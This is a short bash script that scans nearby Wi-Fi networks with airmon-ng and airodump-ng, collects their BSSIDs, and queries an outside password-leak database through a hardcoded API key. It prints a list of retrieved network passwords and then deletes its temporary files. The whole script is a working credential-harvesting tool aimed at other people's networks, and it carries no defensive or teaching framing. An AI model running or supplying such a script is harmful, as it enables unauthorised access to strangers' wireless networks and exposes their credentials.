#!/bin/bash
echo "Enter wlan# "
sudo iw dev | grep -E "Interface "

read wlan

sudo  airmon-ng start $wlan

sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $wlan'mon' -w /tmp/openwifinetworks --output-forma csv"

cat /tmp/openwifinetworks-01.csv | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}' | cut -f1 -d "," > /tmp/bssid.txt


while read bssid
 do curl --request POST "http://3wifi.stascorp.com/api/ajax.php?Query=Find&Key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&BSSID=$bssid&Version=0.5" | awk -F'[,]' '{print $2,$3}' >>/tmp/pass.txt
 done < /tmp/bssid.txt 

 

paste /tmp/bssid.txt /tmp/pass.txt > /tmp/pass.log 

sudo airmon-ng stop $wlan'mon'

clear

sudo rm /tmp/openwifinetworks-01.csv
sudo rm /tmp/openwifinetworks-01.ivs
sudo rm /tmp/bssid.txt
sudo rm /tmp/pass.txt

cat /tmp/pass.log

